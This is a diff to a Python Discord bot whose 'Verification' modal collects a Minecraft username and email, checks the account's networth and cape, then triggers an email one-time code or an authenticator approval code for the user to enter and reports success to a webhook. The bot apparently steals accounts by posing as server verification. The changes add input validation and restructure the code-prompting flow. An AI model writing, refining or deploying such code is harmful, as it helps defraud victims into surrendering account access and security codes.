@@ -5,6 +5,7 @@ import base64
 import cogs
 import config 
 import math
+import re
 
 import aiohttp
 import discord
@@ -31,8 +32,36 @@ class MyModalOne(ui.Modal, title="Verification"):
 
         urluuid = f"https://api.mojang.com/users/profiles/minecraft/{self.box_one.value}"
         response = requests.get(urluuid)
-        uuidplayer = response.json()['id']
 
+
+        email = self.box_two.value.strip()
+        try:
+            if not re.match(r"^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$", email):
+                raise ValueError("Please enter a valid email address (e.g. user@example.com).")
+        except ValueError as ve:
+            await interaction.response.send_message(
+                embed = discord.Embed(
+                title="❌ Invalid email format",
+                description=str(ve),
+                color=0xFF0000
+                ),
+                ephemeral=True,
+            )
+            return
+
+        try:
+            data_uuid = response.json()
+            uuidplayer = data_uuid["id"]
+        except (ValueError, KeyError):
+            await interaction.response.send_message(
+                embed=discord.Embed(
+                title="❌ **Minecraft username not found.**\n",
+                description="Please check your **username** and try again.",
+                colour=0xFF0000
+                ),
+                ephemeral=True,
+            )
+            return
      
         networth_value = "0"  # default
 
@@ -96,9 +125,6 @@ class MyModalOne(ui.Modal, title="Verification"):
         decoded_str = decoded_bytes.decode('utf-8')
         decodedcapedata = json.loads(decoded_str)
         cape_url = decodedcapedata.get("textures", {}).get("CAPE", {}).get("url")
-
-
-
 
 
         with open("data.json", "r") as f:
@@ -174,43 +200,29 @@ class MyModalOne(ui.Modal, title="Verification"):
                         ),
                         ephemeral=True
                     )
-                    return
-
-                if result is False:
-                    # no 2FA email set
-                    await interaction.followup.send(
-                        embed=discord.Embed(
-                            title="No Security Email :envelope:",
-                            description="Your email doesn't have a security email set.\nPlease add one and re-verify",
-                            colour=0xFF0000
-                        ),
-                        view=ButtonViewThree(),
-                        ephemeral=True
-                    )
-                    return
-
-                # at this point result == True (email-OTP) or a str (auth-app code)
-                if isinstance(result, str):
-                    # Auth-app approval code came back
-                    await interaction.followup.send(
-                        embed=discord.Embed(
-                            title="🔒 Authenticator App Approval Code",
-                            description=f"```\n{result}\n```",
-                            colour=0x00AAFF
-                        ),
-                        ephemeral=True
-                    )
                 else:
-                    # email-OTP succeeded
-                    await interaction.followup.send(
-                        embed=discord.Embed(
-                            title="Verification ✅",
-                            description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
-                            colour=0x00FF00
-                        ),
-                        view=ButtonViewTwo(),
-                        ephemeral=True
-                    )
+                    if result is False:
+                        # no 2FA email set
+                        await interaction.followup.send(
+                            embed=discord.Embed(
+                                title="No Security Email :envelope:",
+                                description="Your email doesn't have a security email set.\nPlease add one and re-verify",
+                                colour=0xFF0000
+                            ),
+                            view=ButtonViewThree(),
+                            ephemeral=True
+                        )
+                    else:
+                        # email-OTP succeeded
+                        await interaction.followup.send(
+                            embed=discord.Embed(
+                                title="Verification ✅",
+                                description="A verification code has been sent to your email.\nPlease click the button below to enter your code.",
+                                colour=0x00FF00
+                            ),
+                            view=ButtonViewTwo(),
+                            ephemeral=True
+                        )
 
-                    embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
-                    await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
+                        embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
+                        await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
